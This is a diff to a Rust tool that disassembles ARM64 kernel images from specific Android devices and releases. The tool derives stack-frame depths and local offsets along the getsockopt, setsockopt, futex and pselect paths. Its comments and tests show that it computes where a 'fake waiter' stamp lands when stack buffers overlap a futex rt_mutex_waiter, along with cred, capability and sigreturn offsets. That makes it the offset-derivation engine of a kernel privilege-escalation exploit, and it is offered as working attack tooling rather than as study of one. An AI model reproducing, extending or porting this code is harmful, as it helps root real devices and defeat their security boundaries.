@@ -7,8 +7,9 @@ use regex::Regex;
 
 use crate::btf::Btf;
 use crate::disasm::{
-    add_sp_immediates, cmp_immediates, disassemble_range, first_sp_frame, has_direct_call,
-    is_mov_w0_wzr, is_mov_x1, materialized_address, validate_frame_live_at,
+    add_sp_immediates, cmp_immediates, cmp_immediates_any_width, disassemble_range,
+    first_sp_frame, has_call_or_tail_branch, has_direct_call,
+    is_mov_w0_wzr, is_mov_x1, materialized_address, split_line, validate_frame_live_at,
 };
 use crate::error::{ExtractError, Result};
 use crate::kallsyms::unique_or_err;
@@ -134,18 +135,6 @@ pub struct TcpZerocopyLayout {
     pub delta: i64,
 }
 
-/// The TCP `getsockopt` chain: syscall entry, socket layer, proto-ops wrapper,
-/// protocol handler and option dispatcher. The two middle links are indirect
-/// (`sock->ops->getsockopt`, `sk_prot->getsockopt`), so the chain is named
-/// rather than walked; the direct links are validated in the derivation.
-const GETSOCKOPT_CHAIN: &[&str] = &[
-    "__arm64_sys_getsockopt",
-    "__sys_getsockopt",
-    "sock_common_getsockopt",
-    "tcp_getsockopt",
-    "do_tcp_getsockopt",
-];
-
 /// The fake waiter's last buffer word ends at 0x30 + 8; a copy cap below this
 /// cannot carry the whole stamp.
 pub const TCP_FAKE_WAITER_END: u64 = 0x38;
@@ -166,6 +155,59 @@ fn zc_local_before_call(lines: &[String], target: u64) -> Option<u64> {
             }
             if mov.is_match(previous) {
                 return Some(0);
+            }
+        }
+    }
+    None
+}
+
+/// The zc local when `tcp_zerocopy_receive` is inlined into its caller: the
+/// `TCP_ZEROCOPY_RECEIVE` case's `copy_from_sockptr(&zc, optval, len)`
+/// destination. Anchor on the length/cap pair (`cmp wN, #0xc` then
+/// `cmp wN, #cap+1`) — the same pair `copy_cap_from_dis` reads — and take the
+/// `add x0, sp, #imm` / `mov x0, sp` that feeds the copy call after it.
+fn zc_local_inlined(lines: &[String]) -> Option<u64> {
+    let cmp = Regex::new(r"(?i)\bcmp\s+w(\d+),\s*#0x([0-9a-f]+)\b").ok()?;
+    let add = Regex::new(r"(?i)\badd\s+x0,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+    let mov = Regex::new(r"(?i)\bmov\s+x0,\s*sp\b").unwrap();
+    let bl = Regex::new(r"(?i)\bbl\s+0x[0-9a-f]+\b").unwrap();
+    for (index, line) in lines.iter().enumerate() {
+        let Some(first) = cmp.captures(line) else {
+            continue;
+        };
+        if first.get(2).map(|value| value.as_str()) != Some("c") {
+            continue;
+        }
+        let register = first.get(1)?.as_str().to_string();
+        let end = (index + 5).min(lines.len());
+        let mut second = None;
+        for offset in 0..end.saturating_sub(index + 1) {
+            let Some(next) = cmp.captures(&lines[index + 1 + offset]) else {
+                continue;
+            };
+            if next.get(1).map(|value| value.as_str()) != Some(register.as_str()) {
+                continue;
+            }
+            let Some(limit) = u64::from_str_radix(next.get(2)?.as_str(), 16).ok() else {
+                continue;
+            };
+            if (0x11..=0x101).contains(&limit) {
+                second = Some(index + 1 + offset);
+                break;
+            }
+        }
+        let Some(second) = second else {
+            continue;
+        };
+        for at in (second + 1)..((second + 10).min(lines.len())) {
+            if let Some(captures) = add.captures(&lines[at]) {
+                return u64::from_str_radix(captures.get(1)?.as_str(), 16).ok();
+            }
+            if mov.is_match(&lines[at]) {
+                return Some(0);
+            }
+            if bl.is_match(&lines[at]) {
+                break;
             }
         }
     }
@@ -251,12 +293,6 @@ pub fn derive_tcp_zerocopy_layout(
     sorted_offsets: &[u64],
     waiter_depth: i64,
 ) -> Result<TcpZerocopyLayout> {
-    let receive = unique_offset(symbols, "tcp_zerocopy_receive").map_err(|_| {
-        ExtractError::new(
-            "tcp_zerocopy_receive is absent from kallsyms (inlined or missing); \
-             the zc local is not derivable",
-        )
-    })?;
     let dis = disassemble_symbol(
         kernel,
         symbols,
@@ -264,11 +300,30 @@ pub fn derive_tcp_zerocopy_layout(
         "do_tcp_getsockopt",
         OBJDUMP_CAP,
     )?;
-    let zc_local = zc_local_before_call(&dis, receive).ok_or_else(|| {
-        ExtractError::new(
-            "do_tcp_getsockopt: no tcp_zerocopy_receive call with a stack zc local",
-        )
-    })?;
+    let zc_local = match unique_offset_optional(symbols, "tcp_zerocopy_receive") {
+        Some(receive) => zc_local_before_call(&dis, receive).ok_or_else(|| {
+            ExtractError::new(
+                "do_tcp_getsockopt: no tcp_zerocopy_receive call with a stack zc local",
+            )
+        })?,
+        None => {
+            /* The handler inlines tcp_zerocopy_receive(): the symbol is gone,
+             * but the ZEROCOPY case still copies the user struct into its own
+             * stack local right after the length/cap checks. */
+            if !tcp_zerocopy_receive_inlined(kernel, symbols, sorted_offsets) {
+                return Err(ExtractError::new(
+                    "tcp_zerocopy_receive is absent from kallsyms (inlined or missing); \
+                     the inlined call-site probe did not find it either",
+                ));
+            }
+            zc_local_inlined(&dis).ok_or_else(|| {
+                ExtractError::new(
+                    "do_tcp_getsockopt: the inlined TCP_ZEROCOPY_RECEIVE copy \
+                     destination is not unique or not found",
+                )
+            })?
+        }
+    };
     let mut caps = copy_cap_from_dis(&dis);
     caps.sort_unstable();
     caps.dedup();
@@ -280,19 +335,39 @@ pub fn derive_tcp_zerocopy_layout(
             )))
         }
     };
-    for (caller, callee) in [
-        ("__arm64_sys_getsockopt", "__sys_getsockopt"),
-        ("tcp_getsockopt", "do_tcp_getsockopt"),
-    ] {
-        let caller_dis = disassemble_symbol(kernel, symbols, sorted_offsets, caller, OBJDUMP_CAP)?;
-        let target = unique_offset(symbols, callee)?;
-        if !has_direct_call(&caller_dis, target) {
-            return Err(ExtractError::new(format!(
-                "{caller} does not directly call {callee}"
-            )));
-        }
+    /* The TCP getsockopt path: the syscall wrapper -> (__sys_getsockopt) ->
+     * sock_common_getsockopt -> tcp_getsockopt -> do_tcp_getsockopt. The socket
+     * layer's two links are indirect (`sock->ops->getsockopt`,
+     * `sk_prot->getsockopt`), so they are named rather than walked. Some builds
+     * inline __sys_getsockopt into the wrapper (6.1.134: the wrapper's 0x60
+     * frame carries the whole body and never calls the symbol), and that inlined
+     * link must not add a second frame. The last link is a direct call and is
+     * still validated. */
+    let wrapper = disassemble_symbol(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "__arm64_sys_getsockopt",
+        OBJDUMP_CAP,
+    )?;
+    let sys_linked = unique_offset_optional(symbols, "__sys_getsockopt")
+        .is_some_and(|target| has_call_or_tail_branch(&wrapper, target));
+    let tcp = disassemble_symbol(kernel, symbols, sorted_offsets, "tcp_getsockopt", OBJDUMP_CAP)?;
+    if !has_direct_call(&tcp, unique_offset(symbols, "do_tcp_getsockopt")?) {
+        return Err(ExtractError::new(
+            "tcp_getsockopt does not directly call do_tcp_getsockopt",
+        ));
     }
-    let chain_sum = sum_chain_frames(kernel, symbols, sorted_offsets, GETSOCKOPT_CHAIN)?;
+    let mut chain: Vec<&str> = vec!["__arm64_sys_getsockopt"];
+    if sys_linked {
+        chain.push("__sys_getsockopt");
+    }
+    chain.extend([
+        "sock_common_getsockopt",
+        "tcp_getsockopt",
+        "do_tcp_getsockopt",
+    ]);
+    let chain_sum = sum_chain_frames(kernel, symbols, sorted_offsets, &chain)?;
     let zc_depth = -(chain_sum as i64) + zc_local as i64;
     let delta = zc_depth - (waiter_depth + 8);
     Ok(TcpZerocopyLayout {
@@ -320,7 +395,6 @@ const SETSOCKOPT_CHAIN: &[&str] = &[
     "udp_setsockopt",
     "ip_setsockopt",
 ];
-const FUTEX_CHAIN: &[&str] = &["__arm64_sys_futex", "do_futex", "futex_wait_requeue_pi"];
 
 fn sum_chain_frames(
     kernel: &[u8],
@@ -338,16 +412,68 @@ fn sum_chain_frames(
     Ok(total)
 }
 
+/// Candidate copy lengths in `ip_setsockopt`: every `mov w2, #imm` that is
+/// preceded (within 8 lines) by a stack-buffer `add xN, sp, #off`. The
+/// multicast verdict uses these instead of the fixed 5.x group-request size,
+/// so a 6.x image with a different copy length is read from the image. The
+/// caller treats an empty set as unknown (or, for a no-BTF 5.10 image only, as
+/// the labelled 5.x fallback).
+pub fn multicast_copy_candidates(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted: &[u64],
+) -> Result<Vec<(&'static str, u64)>> {
+    let mut out = Vec::new();
+    // The copy's home is compiler- and release-dependent: 5.10/5.15 inline the
+    // option handlers into `ip_setsockopt`, 6.1 splits out `do_ip_setsockopt`,
+    // and 6.6/6.12 keep `do_mcast_group_source` as its own symbol. A name an
+    // image does not carry is skipped.
+    for name in ["ip_setsockopt", "do_ip_setsockopt", "do_mcast_group_source"] {
+        let Ok(lines) = disassemble_symbol(kernel, symbols, sorted, name, OBJDUMP_CAP) else {
+            continue;
+        };
+        for size in copy_sizes_from_dis(&lines) {
+            out.push((name, size));
+        }
+    }
+    Ok(out)
+}
+
+fn copy_sizes_from_dis(lines: &[String]) -> Vec<u64> {
+    let mov = Regex::new(r"(?i)\bmov\s+w[23],\s*#0x([0-9a-f]+)\b").unwrap();
+    let add = Regex::new(r"(?i)\badd\s+x\d+,\s*sp,\s*#0x[0-9a-f]+").unwrap();
+    let mut sizes = Vec::new();
+    for (i, line) in lines.iter().enumerate() {
+        let Some(caps) = mov.captures(line) else {
+            continue;
+        };
+        let Ok(size) = u64::from_str_radix(&caps[1], 16) else {
+            continue;
+        };
+        let lo = i.saturating_sub(16);
+        if lines[lo..i].iter().any(|prev| add.is_match(prev)) {
+            sizes.push(size);
+        }
+    }
+    sizes.sort_unstable();
+    sizes.dedup();
+    sizes
+}
+
 /// The `add xN, sp, #off` feeding the `mov w2, #buffer_size` copy in
 /// `ip_setsockopt`: the multicast stamp window offset.
 fn greqs_offset_from_dis(lines: &[String], buffer_size: u64) -> Option<u64> {
-    let mov = Regex::new(&format!(r"(?i)\bmov\s+w2,\s*#0x{buffer_size:x}\b")).unwrap();
-    let add = Regex::new(r"(?i)\badd\s+x\d+,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+    let mov = Regex::new(&format!(r"(?i)\bmov\s+w[23],\s*#0x{buffer_size:x}\b")).unwrap();
+    // The destination argument of memset(greqs, 0, size) / copy_from*(greqs,
+    // ...) is x0. The 6.1 handler has other sp-relative adds in the window
+    // (e.g. another option's sp+0x120 buffer); matching x0 keeps the group
+    // request, not any stack buffer.
+    let add = Regex::new(r"(?i)\badd\s+x0,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
     for (i, line) in lines.iter().enumerate() {
         if !mov.is_match(line) {
             continue;
         }
-        let lo = i.saturating_sub(8);
+        let lo = i.saturating_sub(16);
         for prev in lines[lo..i].iter().rev() {
             if let Some(caps) = add.captures(prev) {
                 return u64::from_str_radix(&caps[1], 16).ok();
@@ -357,8 +483,11 @@ fn greqs_offset_from_dis(lines: &[String], buffer_size: u64) -> Option<u64> {
     None
 }
 
-/// The `add x27, sp, #off` waiter local in `futex_wait_requeue_pi`, proven by
-/// the `add xN, x27, #<pi_tree_entry>` that indexes it.
+/// The waiter local in `futex_wait_requeue_pi`, proven by the
+/// `add xN, <base>, #<pi_tree_entry>` that indexes it. The 5.10/5.15/6.1 builds
+/// materialize it in x27; a 6.12 build may pick another register (x26 on the
+/// A16), so the fallback proves any `add xN, sp, #imm` the same way and
+/// requires a unique offset with a live frame at the anchor.
 fn waiter_local_from_dis(lines: &[String], pi_tree_entry: u64) -> Option<u64> {
     let set = Regex::new(r"(?i)\badd\s+x27,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
     let idx = Regex::new(&format!(
@@ -373,7 +502,24 @@ fn waiter_local_from_dis(lines: &[String], pi_tree_entry: u64) -> Option<u64> {
             }
         }
     }
-    None
+
+    let mut candidates: Vec<(String, u64)> = Vec::new();
+    for (reg, imm) in add_sp_immediates(lines) {
+        let index =
+            Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree_entry:x}\b")).unwrap();
+        if lines.iter().any(|line| index.is_match(line)) {
+            candidates.push((reg, imm));
+        }
+    }
+    let mut seen = BTreeSet::new();
+    candidates.retain(|(_, imm)| seen.insert(*imm));
+    if candidates.len() != 1 {
+        return None;
+    }
+    let (reg, imm) = &candidates[0];
+    let anchor = Regex::new(&format!(r"(?i)\badd\s+{reg},\s*sp,\s*#0x{imm:x}\b")).unwrap();
+    validate_frame_live_at(lines, &anchor, "futex_wait_requeue_pi").ok()?;
+    Some(*imm)
 }
 
 /// Static one-shot multicast `waiter_off` for the target image:
@@ -391,20 +537,51 @@ pub fn multicast_waiter_off(
     pi_tree_entry: u64,
     lock_offset: u64,
 ) -> Result<McastWaiterGeometry> {
-    let setsockopt_frames = sum_chain_frames(kernel, symbols, sorted, SETSOCKOPT_CHAIN)?;
-    let futex_frames = sum_chain_frames(kernel, symbols, sorted, FUTEX_CHAIN)?;
-    let ip = disassemble_symbol(kernel, symbols, sorted, "ip_setsockopt", OBJDUMP_CAP)?;
-    let greqs = greqs_offset_from_dis(&ip, buffer_size)
-        .ok_or_else(|| ExtractError::new("ip_setsockopt multicast copy window not found"))?;
-    let fw = disassemble_symbol(
+    multicast_waiter_off_at(
         kernel,
         symbols,
         sorted,
-        "futex_wait_requeue_pi",
-        OBJDUMP_CAP,
-    )?;
-    let waiter_local = waiter_local_from_dis(&fw, pi_tree_entry)
-        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
+        buffer_size,
+        pi_tree_entry,
+        lock_offset,
+        "ip_setsockopt",
+    )
+}
+
+/// Same geometry with the image's own copy function. 6.x splits the option
+/// handlers out of `ip_setsockopt` into `do_ip_setsockopt`, so the frame sum
+/// must include the function that owns the copy.
+pub(crate) fn multicast_waiter_off_at(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted: &[u64],
+    buffer_size: u64,
+    pi_tree_entry: u64,
+    lock_offset: u64,
+    copy_fn: &'static str,
+) -> Result<McastWaiterGeometry> {
+    let mut chain = SETSOCKOPT_CHAIN.to_vec();
+    if copy_fn != "ip_setsockopt" {
+        /* 6.x splits the handler: `ip_setsockopt` wraps `do_ip_setsockopt`,
+         * which owns the option cases and, from 6.6, calls the copy helper as
+         * a separate function. Sum every layer the image actually carries;
+         * 5.10/5.15 inline them all and add nothing here. */
+        if copy_fn != "do_ip_setsockopt"
+            && unique_offset_optional(symbols, "do_ip_setsockopt").is_some()
+        {
+            chain.push("do_ip_setsockopt");
+        }
+        chain.push(copy_fn);
+    }
+    let setsockopt_frames = sum_chain_frames(kernel, symbols, sorted, &chain)?;
+    /* The futex strip home is a per-image fact: a build may inline `do_futex`
+     * into the 64-bit wrapper (6.1.134), where the fixed chain would
+     * over-count its 0x60 frame. `futex_strip_home` follows the wrapper's own
+     * call path. */
+    let waiter_depth = futex_strip_home(kernel, symbols, sorted, pi_tree_entry)?;
+    let ip = disassemble_symbol(kernel, symbols, sorted, copy_fn, OBJDUMP_CAP)?;
+    let greqs = greqs_offset_from_dis(&ip, buffer_size)
+        .ok_or_else(|| ExtractError::new(format!("{copy_fn} multicast copy window not found")))?;
     let numbers = |waiter_off: i64, setsockopt_depth: u64, waiter_depth: u64| {
         [
             ("waiter_off", waiter_off),
@@ -420,17 +597,7 @@ pub fn multicast_waiter_off(
     let setsockopt_depth = setsockopt_frames.checked_sub(greqs).ok_or_else(|| {
         ExtractError::infeasible_with(
             "greqs offset exceeds setsockopt frames",
-            numbers(0, setsockopt_frames, futex_frames.saturating_sub(waiter_local)),
-        )
-    })?;
-    let waiter_depth = futex_frames.checked_sub(waiter_local).ok_or_else(|| {
-        ExtractError::infeasible_with(
-            "waiter local exceeds futex frames",
-            numbers(
-                setsockopt_depth as i64,
-                setsockopt_depth,
-                futex_frames.saturating_sub(waiter_local),
-            ),
+            numbers(0, setsockopt_frames, waiter_depth),
         )
     })?;
     let waiter_off = setsockopt_depth
@@ -494,7 +661,8 @@ pub fn multicast_waiter_off(
 #[cfg(test)]
 mod tests {
     use super::{
-        fpsimd_copy_destination, multicast_geometry_5x, multicast_geometry_btf_only,
+        compat_carrier_coverage, fpsimd_copy_destination, max_pselect_shift,
+        multicast_geometry_corroborated, multicast_geometry_btf_only,
         pselect_shift_from_delta, remove_waiter_uses_current, select_cred_caps, select_cred_refs,
         sigreturn_offset,
     };
@@ -542,11 +710,11 @@ mod tests {
     }
 
     #[test]
-    fn multicast_geometry_uses_btf_offsets_and_the_proven_constants() {
+    fn multicast_train_fallback_uses_btf_offsets_and_the_probed_constants() {
         let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
         structs.insert("waiter_task".to_string(), Some(48));
         structs.insert("waiter_lock".to_string(), Some(56));
-        let geometry = multicast_geometry_5x(&structs);
+        let geometry = multicast_geometry_corroborated(&structs);
         assert_eq!(geometry.first(), Some(&("waiter_off", 96)));
         assert!(geometry.contains(&("task_offset", 48)));
         assert!(geometry.contains(&("lock_offset", 56)));
@@ -558,21 +726,65 @@ mod tests {
         assert!(geometry.contains(&("compact_waiter", 1)));
 
         let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
-        let geometry = multicast_geometry_5x(&without);
+        let geometry = multicast_geometry_corroborated(&without);
         // No BTF: the 5.10 codegen layout fills task/lock.
         assert!(geometry.contains(&("task_offset", 0x30)));
         assert!(geometry.contains(&("lock_offset", 0x38)));
     }
 
     #[test]
+    fn compat_coverage_matches_the_measured_pairs() {
+        /* The six store images measure home 0x1b0 / dst 0x1e0 (time32) and the
+         * time64 alternative packs at 0x20. Both must pass. */
+        assert_eq!(
+            compat_carrier_coverage(0x1b0, 0x1e0),
+            Some(("futex_time32", 0x30))
+        );
+        assert_eq!(
+            compat_carrier_coverage(0x1c0, 0x1e0),
+            Some(("futex_time64", 0x20))
+        );
+    }
+
+    #[test]
+    fn compat_coverage_refuses_a_strip_deeper_than_the_buffer() {
+        /* 5.10.236: the compat strip lands at 0x200/0x210, deeper than the
+         * 0x1e0 _newselect buffer. */
+        assert_eq!(compat_carrier_coverage(0x200, 0x1e0), None);
+        assert_eq!(compat_carrier_coverage(0x210, 0x1e0), None);
+    }
+
+    #[test]
+    fn compat_coverage_refuses_an_unknown_home() {
+        /* The helper implements the futex_time32 (0x1b0) and futex_time64
+         * (0x1c0) entries only; any other derived home is a capability
+         * refusal, not a guess. */
+        assert_eq!(compat_carrier_coverage(0x1a8, 0x1e0), None);
+        assert_eq!(compat_carrier_coverage(0x1d0, 0x1e0), None);
+    }
+
+    #[test]
+    fn compat_coverage_requires_the_zero_tail_inside_res() {
+        /* With dst == home the res_* window sits below the stamp's zero tail,
+         * so the time32 stamp would rely on bytes the kernel never zeroes. */
+        assert_eq!(compat_carrier_coverage(0x1b0, 0x1b0), None);
+    }
+
+    #[test]
     fn pselect_delta_classifies_geometry_and_the_waiter_band() {
-        assert_eq!(pselect_shift_from_delta(0), Ok(0));
-        assert_eq!(pselect_shift_from_delta(8), Ok(1));
-        assert_eq!(pselect_shift_from_delta(24), Ok(3));
-        assert_eq!(pselect_shift_from_delta(32), Ok(4));
-        assert!(pselect_shift_from_delta(-8).is_err());
-        assert!(pselect_shift_from_delta(4).is_err());
-        assert!(pselect_shift_from_delta(40).is_err());
+        assert_eq!(pselect_shift_from_delta(0, true), Ok(0));
+        assert_eq!(pselect_shift_from_delta(8, true), Ok(1));
+        assert_eq!(pselect_shift_from_delta(24, true), Ok(3));
+        assert_eq!(pselect_shift_from_delta(32, true), Ok(4));
+        assert!(pselect_shift_from_delta(-8, true).is_err());
+        assert!(pselect_shift_from_delta(4, true).is_err());
+        assert!(pselect_shift_from_delta(40, true).is_err());
+        /* The 6.6+ rt_waiter_node strip stamps two more words, so its last
+         * usable shift is 2; shift 3 would be refused by the native. */
+        assert_eq!(pselect_shift_from_delta(16, false), Ok(2));
+        assert!(pselect_shift_from_delta(24, false).is_err());
+        assert_eq!(max_pselect_shift(true), 4);
+        assert_eq!(max_pselect_shift(false), 2);
     }
 
     #[test]
@@ -654,6 +866,20 @@ mod tests {
     }
 
     #[test]
+    fn a_non_x27_waiter_local_is_proven_by_the_pi_tree_index() {
+        /* 6.12.23 (A16): the waiter local is x26 and pi_tree is reached as
+         * `add x27, x26, #0x28`; the later `add x27, sp, #0x80` is a different
+         * local and must not become a candidate. */
+        let fw: Vec<String> = vec![
+            "0000: stp x29, x30, [sp, #-0x1c0]!".to_string(),
+            "0040: add x26, sp, #0xa0".to_string(),
+            "0050: add x27, x26, #0x28".to_string(),
+            "0070: add x27, sp, #0x80".to_string(),
+        ];
+        assert_eq!(super::waiter_local_from_dis(&fw, 0x28), Some(0xa0));
+    }
+
+    #[test]
     fn multicast_waiter_off_matches_the_validated_images() {
         // Depths from the validated images; the arithmetic must reproduce the
         // hardware-observed one-shot waiter_off.
@@ -664,6 +890,50 @@ mod tests {
         assert_eq!(off(0x370, 0x18, 0x390, 0x98), 0x60);
         // PD2361 5.15.178 (static candidate = 0x50).
         assert_eq!(off(0x370, 0x18, 0x330, 0x28), 0x50);
+    }
+
+    #[test]
+    fn the_compat_multicast_copy_is_found_by_the_tif32_branch() {
+        /* A synthetic handler: a TIF_32BIT branch at +0x00 targets +0x40, the
+         * compat block. The block's memset uses w2 (ignored); the copy uses
+         * w3 and a stack destination. The 64-bit sibling is later in the
+         * function at sp+0x18 with the larger 0x108 size. */
+        let mut lines: Vec<String> = Vec::new();
+        lines.push("tbnz w8, #0x16, 0x1040".to_string()); // +0x00
+        for _ in 1..16 {
+            lines.push("mov x0, x1".to_string()); // +0x04..0x3c
+        }
+        for line in [
+            "add x0, sp, #0x120", // +0x40, the branch target
+            "mov w1, wzr",
+            "mov w2, #0x104",
+            "bl 0x900", // memset: the size is in w2 and must not match
+            "cmp w20, #0x104",
+            "b.ne 0x9999",
+            "add x0, sp, #0x120",
+            "mov x1, x22",
+            "mov x2, x21",
+            "mov w3, #0x104",
+            "bl 0x1001", // the compat copy
+            "b 0x9998",
+        ] {
+            lines.push(line.to_string());
+        }
+        for line in [
+            "add x0, sp, #0x18",
+            "mov x1, x22",
+            "mov x2, x21",
+            "mov w3, #0x108",
+            "bl 0x1001", // the 64-bit sibling
+        ] {
+            lines.push(line.to_string());
+        }
+        assert_eq!(
+            super::compat_multicast_copies(&lines, 0x1000, Some(0x108)),
+            Ok((0x120, 0x104))
+        );
+        // Without the sibling the case is not proven.
+        assert!(super::compat_multicast_copies(&lines[..28], 0x1000, Some(0x108)).is_err());
     }
 
     #[test]
@@ -768,26 +1038,53 @@ impl WaiterLayout {
 }
 
 /// The route's fd_set word table: `PSELECT_ROUTE_NFDS` fd slots over three
-/// sets, and the compact waiter strip's last word. The waiter shift is the
-/// layout delta in qwords; the last strip word must still land inside the
-/// copied table (`(320 + 63) / 64 * 3 = 15` words, strip words 0..10).
-pub const MAX_PSELECT_SHIFT: u64 = 4;
+/// sets, `(320 + 63) / 64 * 3 = 15` 64-bit words. The waiter shift is the
+/// layout delta in qwords; the strip's last word must still land inside the
+/// copied table.
+pub const PSELECT_TABLE_WORDS: u64 = (PSELECT_ROUTE_NFDS + 63) / 64 * 3;
+
+/// Stamped words in the two `rt_mutex_waiter` shapes: the compact strip
+/// (5.10/5.15/6.1, strip words 0..10) is 11 words, the 6.6+ `rt_waiter_node`
+/// pair (0..12) is 13.
+pub const PSELECT_COMPACT_STRIP_WORDS: u64 = 11;
+pub const PSELECT_NON_COMPACT_STRIP_WORDS: u64 = 13;
+
+/// The largest derived shift that keeps the strip inside the table. The shape
+/// is a per-image fact (`layout::waiter_is_compact`), not a release gate: a
+/// non-compact image with shift 3-4 would otherwise be declared feasible here
+/// and then refused by the native's `select_stack_build_fdsets` (step 34).
+pub fn max_pselect_shift(compact: bool) -> u64 {
+    let strip = if compact {
+        PSELECT_COMPACT_STRIP_WORDS
+    } else {
+        PSELECT_NON_COMPACT_STRIP_WORDS
+    };
+    PSELECT_TABLE_WORDS - strip
+}
 
 /// Classify the pselect/futex overlap in bytes. A negative or misaligned delta
-/// is a geometric impossibility, as is a shift beyond the word table; every
-/// other derivation failure stays a generic error (Unknown, not Infeasible).
-pub fn pselect_shift_from_delta(delta: i64) -> std::result::Result<u64, String> {
+/// is a geometric impossibility, as is a shift beyond the table for the image's
+/// waiter shape; every other derivation failure stays a generic error (Unknown,
+/// not Infeasible).
+pub fn pselect_shift_from_delta(delta: i64, compact: bool) -> std::result::Result<u64, String> {
     if delta < 0 || delta % 8 != 0 {
         return Err(format!(
             "pselect/futex overlap is not a non-negative qword: delta={delta}"
         ));
     }
     let shift = (delta / 8) as u64;
-    if shift > MAX_PSELECT_SHIFT {
+    let limit = max_pselect_shift(compact);
+    if shift > limit {
+        let strip = if compact {
+            PSELECT_COMPACT_STRIP_WORDS
+        } else {
+            PSELECT_NON_COMPACT_STRIP_WORDS
+        };
+        let shape = if compact { "compact" } else { "non-compact" };
         return Err(format!(
             "futex waiter starts {shift} qwords above the fd_set buffer; the route's \
-             word table holds 15 words and the waiter strip 11 (max feasible shift is \
-             {MAX_PSELECT_SHIFT})"
+             word table holds {PSELECT_TABLE_WORDS} words and the {shape} waiter strip \
+             {strip} (max feasible shift is {limit})"
         ));
     }
     Ok(shift)
@@ -1047,7 +1344,13 @@ pub fn derive_pselect_layout(
         .sum();
     let futex_waiter = -(futex_sum as i64) + *waiter_local as i64;
     let delta = futex_waiter - pselect_word0;
-    let shift = pselect_shift_from_delta(delta).map_err(|reason| {
+    // The strip length depends on the waiter shape: the 6.6+ rt_waiter_node
+    // pair stamps two words beyond the compact strip. A BTF-less image is the
+    // 5.10 codegen template, which is compact.
+    let compact_waiter = btf
+        .and_then(crate::layout::waiter_is_compact)
+        .unwrap_or(true);
+    let shift = pselect_shift_from_delta(delta, compact_waiter).map_err(|reason| {
         ExtractError::infeasible_with(
             reason,
             pselect_numbers(
@@ -1059,10 +1362,12 @@ pub fn derive_pselect_layout(
             ),
         )
     })?;
-    if shift == MAX_PSELECT_SHIFT {
+    if shift == max_pselect_shift(compact_waiter) {
         eprintln!(
             "warning: waiter fits at the last usable word (shift={shift}); \
-             the strip's last word lands at global word 14 of 15"
+             the strip's last word lands at global word {} of {}",
+            PSELECT_TABLE_WORDS - 1,
+            PSELECT_TABLE_WORDS
         );
     }
     let chain = pselect_chain
@@ -1166,22 +1471,25 @@ pub fn sigreturn_offset(off: i64) -> std::result::Result<u64, String> {
     Ok(off as u64)
 }
 
-/// The futex strip home: the depth of `futex_wait_requeue_pi`'s waiter local
-/// below the syscall entry (`Σ_futex − waiter_local`).
-fn futex_strip_home(
+/// The futex strip home for one entry wrapper: the depth of
+/// `futex_wait_requeue_pi`'s waiter local below the syscall entry
+/// (`Σ_futex − waiter_local`). The wrapper is a parameter because the 64-bit
+/// entry, the 32-bit `futex_time32` entry and the 32-bit `futex_time64` entry
+/// (which reuses the 64-bit wrapper) all feed the same `do_futex` chain.
+fn futex_chain_home(
     kernel: &[u8],
     symbols: &RelSymbols,
     sorted_offsets: &[u64],
-    pi_tree_entry: u64,
+    wrapper_name: &str,
+    wait_dis: &[String],
+    wait_addr: u64,
+    waiter_local: u64,
 ) -> Result<u64> {
-    let wrapper_name = "__arm64_sys_futex";
     let dispatch_name = "do_futex";
     let wait_name = "futex_wait_requeue_pi";
     let wrapper = disassemble_symbol(kernel, symbols, sorted_offsets, wrapper_name, OBJDUMP_CAP)?;
-    let wait = disassemble_symbol(kernel, symbols, sorted_offsets, wait_name, OBJDUMP_CAP)?;
-    let wait_addr = unique_offset(symbols, wait_name)?;
     let wrapper_frame = first_sp_frame(&wrapper, wrapper_name)?;
-    let wait_frame = first_sp_frame(&wait, wait_name)?;
+    let wait_frame = first_sp_frame(wait_dis, wait_name)?;
     let sum = if has_direct_call(&wrapper, wait_addr) {
         wrapper_frame
             .checked_add(wait_frame)
@@ -1199,10 +1507,598 @@ fn futex_strip_home(
             .and_then(|value| value.checked_add(wait_frame))
             .ok_or_else(|| ExtractError::new("futex chain overflow"))?
     };
-    let waiter_local = waiter_local_from_dis(&wait, pi_tree_entry)
-        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
     sum.checked_sub(waiter_local)
         .ok_or_else(|| ExtractError::new("waiter local exceeds futex frames"))
+}
+
+/// The futex strip home of the 64-bit entry, with the waiter local derived
+/// from `futex_wait_requeue_pi` itself.
+fn futex_strip_home(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    pi_tree_entry: u64,
+) -> Result<u64> {
+    let wait_name = "futex_wait_requeue_pi";
+    let wait = disassemble_symbol(kernel, symbols, sorted_offsets, wait_name, OBJDUMP_CAP)?;
+    let wait_addr = unique_offset(symbols, wait_name)?;
+    let waiter_local = waiter_local_from_dis(&wait, pi_tree_entry)
+        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
+    futex_chain_home(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "__arm64_sys_futex",
+        &wait,
+        wait_addr,
+        waiter_local,
+    )
+}
+
+/// The AArch32 compat select carrier's per-image geometry. Both halves come
+/// from the image's own code: the compat `_newselect` handler's fd_set buffer
+/// depth and the 32-bit futex entry's waiter strip home. No release family
+/// participates; an image without the compat symbols, with a waiter shape the
+/// carrier's stamp cannot represent, or whose depths do not cover the strip
+/// reports why instead.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct CompatCarrierLayout {
+    /// The strip home below the compat entry sp: 0x1b0 (futex_time32) or
+    /// 0x1c0 (futex_time64). Those are the two entries the armv7 helper
+    /// implements; any other derived home is a capability refusal.
+    pub waiter_home: u64,
+    /// The compat `_newselect` fd_set buffer's deepest byte (depth).
+    pub select_dst_depth: u64,
+    /// `select_dst_depth - waiter_home`: where the strip is packed.
+    pub offset: u64,
+    /// `futex_time32` or `futex_time64`; names the syscall entry the home was
+    /// derived from.
+    pub abi: &'static str,
+}
+
